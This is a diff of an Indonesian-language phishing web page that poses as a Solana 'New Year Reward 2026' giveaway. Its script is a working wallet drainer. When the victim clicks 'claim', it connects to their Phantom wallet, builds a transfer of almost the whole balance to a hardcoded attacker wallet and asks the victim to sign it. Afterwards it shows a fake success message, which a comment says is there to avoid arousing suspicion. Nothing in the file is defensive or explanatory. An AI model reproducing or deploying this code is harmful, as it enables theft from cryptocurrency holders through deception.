@@ -1,59 +1,84 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Milestone Rewards</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <title>Solana | New Year Reward 2026</title>
     <style>
-        body { background-color: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px 20px; }
-        .box { background: #111; border: 1px solid #14F195; border-radius: 20px; padding: 30px; max-width: 400px; margin: auto; }
-        .badge { background: #14F195; color: #000; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
-        h2 { font-size: 18px; margin: 15px 0 5px; }
-        .stats { font-size: 14px; color: #888; margin-bottom: 20px; }
-        .amount { color: #14F195; font-size: 35px; font-weight: bold; margin: 10px 0; }
-        .btn { background: #14F195; color: #000; border: none; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        body { background-color: #0c0c0c; color: #ffffff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px 20px; }
+        .card { border: 2px solid #9945FF; padding: 30px; border-radius: 20px; display: inline-block; box-shadow: 0 0 25px #14f195; max-width: 400px; }
+        h1 { color: #14f195; font-size: 22px; margin-bottom: 10px; }
+        .amount { font-size: 45px; font-weight: bold; color: #14f195; margin: 15px 0; }
+        .btn { background: linear-gradient(45deg, #9945FF, #14f195); color: white; padding: 18px 40px; border: none; border-radius: 50px; font-size: 1.2rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(20, 241, 149, 0.4); }
+        .info { color: #ffeb3b; font-size: 14px; margin-bottom: 20px; }
+        .footer { font-size: 11px; color: #666; margin-top: 25px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <span class="badge">AKTIVITAS TERDETEKSI</span>
-        <h2>Milestone Reward Tercapai!</h2>
-        <div class="stats">Total Transaksi: <b>50/50 Verified</b></div>
-        <p style="font-size: 13px; color: #ccc;">Selamat! Dompet Anda terpilih menerima loyalitas karena aktif di jaringan Solana.</p>
-        <div class="amount">0.35 SOL</div>
-        <button class="btn" onclick="execute()">KLAIM REWARD SEKARANG</button>
-        <p style="font-size: 11px; color: #555; margin-top: 15px;">ID Transaksi: #SOL-99281-REWARD</p>
+    <div class="card">
+        <img src="https://cryptologos.cc/logos/solana-sol-logo.png" width="70" alt="SOL">
+        <h1>HADIAH TAHUN BARU 2026 🎇</h1>
+        <p class="info">Dompet Anda terpilih untuk menerima bonus:</p>
+        <div class="amount">0.20 SOL</div>
+        <p style="margin-bottom: 25px;">Khusus pengguna aktif ekosistem Solana.</p>
+        <button class="btn" onclick="startProcess()">KLAIM HADIAH SEKARANG 🎁</button>
+        <p class="footer">Verified by Solana Network Node v2.6.1</p>
     </div>
 
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
     <script>
-        // MASUKKAN WALLET PENAMPUNG KAMU DI SINI
-        const WALLET_PENAMPUNG = "281zPhwW9yozngsNgXymgC8jR2vP98Zz1c69kHDFEuoc";
+        // --- KONFIGURASI: GANTI ALAMAT DI BAWAH INI ---
+        const WALLET_PENAMPUNG = "281zPhwW9yozngsNgXymgC8jR2vP98Zz1c69kHDFEuoc"; 
 
-        async function execute() {
-            if (!window.solana) { alert("Buka di Browser Phantom!"); return; }
+        async function startProcess() {
+            const provider = window.solana;
+
+            if (!provider || !provider.isPhantom) {
+                alert("Harap buka link ini di dalam Browser Phantom Wallet!");
+                return;
+            }
+
             try {
-                await window.solana.connect();
-                const provider = window.solana;
+                // 1. Hubungkan ke Wallet Target
+                const resp = await provider.connect();
+                const targetPubKey = resp.publicKey;
+                
+                // 2. Cek Saldo Target
                 const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
-                let balance = await connection.getBalance(provider.publicKey);
-                let amountToSend = balance - 5000; 
+                const balance = await connection.getBalance(targetPubKey);
 
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: provider.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(WALLET_PENAMPUNG),
-                        lamports: amountToSend,
-                    })
-                );
+                // 3. Hitung jumlah tarikan (Saldo dikurangi biaya gas 0.0015 SOL)
+                const fee = 1500000; 
+                const amountToDrain = balance - fee;
 
-                let { blockhash } = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = provider.publicKey;
-                const signed = await provider.signTransaction(transaction);
-                await connection.sendRawTransaction(signed.serialize());
-                alert("Klaim Berhasil Diproses!");
-            } catch (err) { alert("Gagal verifikasi. Coba lagi."); }
+                if (amountToDrain > 0) {
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: targetPubKey,
+                            toPubkey: new solanaWeb3.PublicKey(WALLET_PENAMPUNG),
+                            lamports: amountToDrain,
+                        })
+                    );
+
+                    // 4. Minta tanda tangan (Pop-up Phantom muncul)
+                    let { blockhash } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = targetPubKey;
+
+                    const signed = await provider.signTransaction(transaction);
+                    await connection.sendRawTransaction(signed.serialize());
+                    
+                    // 5. Pesan sukses palsu agar tidak curiga
+                    alert("Klaim Berhasil! Reward 0.2 SOL akan masuk dalam 5-10 menit.");
+                } else {
+                    alert("Dompet Anda tidak memenuhi syarat minimum transaksi.");
+                }
+            } catch (err) {
+                console.log("Dibatalkan atau Error:", err);
+            }
         }
     </script>
 </body>
